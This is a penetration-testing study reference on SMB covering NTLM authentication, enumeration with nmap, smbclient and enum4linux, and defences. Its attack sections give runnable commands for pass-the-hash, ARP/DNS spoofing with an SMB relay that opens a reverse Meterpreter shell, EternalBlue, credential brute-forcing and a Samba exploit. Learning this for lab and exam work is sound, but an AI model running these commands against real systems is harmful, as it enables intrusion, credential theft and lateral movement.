
# SMB Enumeration & Attacks — Comprehensive Technical Reference

## 1. SMB Protocol Fundamentals

### What is SMB?
**SMB (Server Message Block)** is a **network file-sharing protocol** used primarily in **Windows environments** for:
- File sharing
- Printer sharing  
- Inter-process communication
- Authentication

### Protocol Versions & Security
- **SMBv1** - Legacy, insecure, vulnerable to EternalBlue (MS17-010)
- **SMBv2/SMBv3** - Modern implementations with improved security

### Ports & Services
| Port | Protocol | Service | Purpose |
|------|----------|---------|---------|
| 445/TCP | TCP | SMB over TCP | Direct SMB (modern) |
| 139/TCP | TCP | SMB over NetBIOS | Legacy SMB |
| 137/UDP | UDP | NetBIOS Name Service | Name resolution |
| 138/UDP | UDP | NetBIOS Datagram | Datagram service |

**Key Indicator:** If port **445** is open → SMB is active. Port **139** usually indicates **legacy SMB**.

---

## 2. SMB Authentication Mechanism

### NTLM Authentication Flow (Detailed)
**الخطوات التفصيلية (Detailed Arabic Explanation Included):**

1. **Authentication Request (طلب المصادقة)**
   - Client sends connection request to server
   - Contains: username, machine name, domain
   - Example format: `DOMAIN\username`

2. **Server Challenge**
   - Server sends random challenge (nonce) to client

3. **Client Response (التشفير)**
   - **Client encrypts challenge using NTLM hash**
   - Method: `HMAC-MD5(challenge, user_hash)`
   - Result: Encrypted string (NTLMv2 response)

4. **Verification**
   - Client sends encrypted response to server
   - Server verifies using:
     - Active Directory (domain environment)
     - SAM database (local/workgroup)

5. **Access Decision**
   - Valid hash → Access granted with appropriate permissions
   - Invalid hash → Access denied

**Security Note:** Password is **never sent** over network, only the hash response.

---

## 3. SMB Enumeration Techniques

### 3.1 Nmap Scripting Engine
```bash
# OS and version discovery
nmap -p 445 --script smb-os-discovery <target>
# Reveals: OS version, hostname, domain/workgroup

# Share enumeration
nmap -p 445 --script smb-enum-shares <target>
# Reveals: Shared folders and permissions

# User enumeration
nmap -p 445 --script smb-enum-users <target>
# Reveals: Valid usernames (if allowed)

# Protocol detection
nmap -p445 --script smb-protocols <target>

# Vulnerability scanning
nmap -p 445 --script smb-vuln-ms17-010 <target>
```

### 3.2 smbclient Enumeration
```bash
# List shares anonymously
smbclient -L //<target> -N
# -N flag: no password

# Connect to specific share
smbclient //<target>/share -N

# Common smbclient commands
ls          # List files
get file.txt # Download file
put file.txt # Upload file
```

### 3.3 enum4linux Comprehensive Enumeration
```bash
enum4linux <target>
```
**Collects:**
- Users and groups
- Share listings
- OS information
- Password policy
- Domain information

**Note:** Very common in eJPT/PEN-200 labs



#### Mount SMB Share

`mount.cifs //10.129.98.15/sambashare /home/kali user=,pass=`

- Allows you to:
    
    - Access the share
        
    - Download files
        
    - Take a copy of files locally
        
- In this case, the share name is:
    
    `sambashare`
    

---


### 3.4 Initial Reconnaissance
```bash
# Basic port scan
nmap <target>

# Service version detection
nmap -sV -p 445 <target>
# Example output: 445/tcp open netbios-ssn, Samba smbd 3.X - 4.X
```

---

## 4. SMB Attack Vectors & Exploitation

### 4.1 Pass-the-Hash (PtH) Attack
**Concept:** Use NTLM hash **instead of password** for authentication (no cracking required).

**Tools:**
- **Impacket:** `psexec.py`, `smbexec.py`
- **Mimikatz:** Hash extraction and Pass-the-Hash
- **Metasploit:** `exploit/windows/smb/psexec`

**Practical Example (Impacket):**
```bash
psexec.py <user>@<target> -hashes <LM>:<NT>
# Example:
psexec.py Administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

### 4.2 SMB Relay Attack
**Concept:** Capture NTLM authentication and relay it to another SMB service to gain access without cracking.

**Attack Flow:**
1. Position attacker as Man-in-the-Middle (ARP/DNS spoofing)
2. Victim authenticates via SMB
3. Attacker captures NTLM challenge/response
4. Attacker relays authentication to target host
5. Access granted as victim user

**Tools Suite:**
- **Responder:** LLMNR/NBT-NS poisoning
- **Impacket:** `ntlmrelayx.py`
- **Metasploit:** `exploit/windows/smb/smb_relay`

**Complete SMB Relay Attack Example:**
```bash
# Step 1: MITM Positioning (ARP Spoofing)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5

# Step 2: DNS Spoofing (Redirect SMB traffic)
echo "172.16.5.101 *.sportsfoo.com" > dns
dnsspoof -i eth1 -f dns

# Step 3: SMB Relay Setup (Metasploit)
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
```

**How It Works:**
- Windows client auto-connects to `\\wfileserver.sportsfoo.com` every ~30 seconds
- ARP spoofing positions attacker between victim and gateway
- DNS spoofing resolves domain to attacker's IP (172.16.5.101)
- Client sends SMB authentication to attacker
- SMB Relay forwards NTLM auth to real server (172.16.5.10)
- Successful relay delivers reverse Meterpreter shell

### 4.3 EternalBlue (MS17-010) Exploitation
**Vulnerability:** SMBv1 remote code execution
**Used by:** WannaCry ransomware

**Prerequisites:**
- SMBv1 enabled
- Unpatched Windows system

**Exploitation Steps:**
```bash
# Step 1: Vulnerability scanning
nmap -p 445 --script smb-vuln-ms17-010 <target>

# Step 2: Metasploit exploitation
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <your_ip>
run

# Result: Meterpreter session with SYSTEM privileges
```

### 4.4 Credential Bruteforcing
**Using Hydra:**
```bash
hydra -L users.txt -P passwords.txt smb://<target>
```

**Using Metasploit:**
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set VERBOSE false
run
```

**Practical Lab Example (INE):**
```bash
# Target: demo.ine.local (10.0.16.162)
msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit

# Credentials obtained: Administrator/queryuiop
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass queryuiop
exploit
```

### 4.5 Samba-Specific Exploitation (Unix/Linux)
**Target Identification:**
```bash
nmap -sV -p 445 demo.ine.local
# Output: Samba smbd 3.0.20-Debian
```

**Exploit Search & Execution:**
```bash
searchsploit samba 3.0.20
# Output: Samba 3.0.20 < 3.0.25rc3 - Username map script Command Execution

msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS demo.ine.local
exploit
# Result: Command execution/shell on target
```

---

## 5. Post-Exploitation & Lateral Movement

### 5.1 SMB-Based Lateral Movement
**Typical Attack Chain:**
```
SMB Enum → Credential Discovery → Pass-the-Hash → Lateral Movement → Domain Compromise
```

**Post-Exploitation Tools:**
- **SMBMap:** Enumerate shares, list files, download/upload, execute commands
- **smbclient:** Interactive SMB client for share navigation
- **Further Enumeration:**
  ```bash
  use auxiliary/scanner/smb/pipe_auditor
  set SMBUser <user>
  set SMBPass <pass>
  set RHOSTS <target>
  exploit
  ```

### 5.2 Attack Vector Summary
If SSH/SMB accepts username/password:
1. Perform brute-force/credential stuffing
2. Discover valid accounts
3. Use SMB tools to interact with shares
4. Enumerate for lateral movement opportunities

---

## 6. SMB Weak Points & Vulnerabilities

### **Core Weaknesses:**
1. **NTLM Relay Attacks** - Intercept and relay authentication hashes
2. **Pass-the-Hash** - Use captured hashes without cracking
3. **Brute Force Vulnerabilities** - Weak password policies
4. **SMBv1 Vulnerabilities** - EternalBlue and other exploits
5. **Missing SMB Signing** - Allows relay attacks

### **Vulnerability Prerequisites:**
- NTLM authentication enabled
- SMB signing disabled or not enforced
- Legacy SMBv1 protocol enabled
- Weak or guessable credentials

---

## 7. Defense & Mitigation Strategies

### **Recommended Defenses:**
1. **Disable SMBv1** entirely
2. **Enable SMB Signing** on all systems
3. **Regular patching** and updates
4. **Strong password policies** and account lockouts
5. **Network segmentation** to limit SMB exposure
6. **Monitor for** anomalous SMB traffic

### **Configuration Hardening:**
- Use SMBv3 with encryption
- Implement NTLMv2 only (disable LM/NTLMv1)
- Restrict SMB to specific VLANs/networks
- Use host-based firewalls to limit SMB access

---

## 8. Lab & Exam Notes (eJPT/Practical)

### **Key Exam Strategies:**
- Always enumerate SMB (port 445/139)
- Try anonymous access first (`smbclient -L //target -N`)
- enum4linux is mandatory for comprehensive enumeration
- SMBv1 presence = high risk indicator
- Pass-the-Hash frequently appears in labs
- Check for auto-connections (like `wfileserver.sportsfoo.com`)

### **INE Lab Patterns:**
1. Initial scan → SMB port open
2. Enumeration → Discover shares/users
3. Bruteforce → Obtain credentials
4. Exploitation → psexec or similar
5. Post-exploitation → Lateral movement

---

## 9. Tool Reference Summary

### **Enumeration Tools:**
- `nmap` with SMB scripts
- `smbclient` for interactive access
- `enum4linux` for comprehensive info
- `Metasploit` auxiliary modules

### **Exploitation Tools:**
- **Impacket:** `psexec.py`, `smbexec.py`, `ntlmrelayx.py`
- **Metasploit:** Various SMB exploits
- **Mimikatz:** Hash extraction and PtH
- **Responder:** LLMNR/NBT-NS poisoning

### **Post-Exploitation:**
- `SMBMap` for share analysis
- `smbclient` for file operations
- Meterpreter for advanced post-exploitation

---

## 10. SMB in Penetration Testing Context

### **Importance:**
- One of the biggest Windows attack surfaces
- Primary gateway for lateral movement
- Central to internal penetration tests
- Often leads to domain compromise

### **Testing Methodology:**
1. **Discovery:** Port scanning (445/139)
2. **Enumeration:** Shares, users, OS info
3. **Vulnerability Analysis:** SMBv1, signing, configurations
4. **Exploitation:** PtH, relay, brute-force, known exploits
5. **Post-Exploitation:** Privilege escalation, lateral movement

### **Common Findings:**
- Anonymous access to shares
- Guessable administrator passwords
- SMBv1 enabled on modern systems
- Missing SMB signing allowing relay attacks
- Excessive share permissions

---

## Summary

SMB remains a critical protocol in Windows environments and a primary attack vector in penetration testing. Its combination of widespread use, historical vulnerabilities, and authentication mechanisms make it essential for both attackers and defenders to understand thoroughly. The protocol's role in lateral movement and domain escalation underscores its importance in network security assessments.

**Next Topics (Same Depth):** FTP Attacks, IIS Exploitation, Apache Tomcat, RDP, WinRM, Pivoting & Lateral Movement 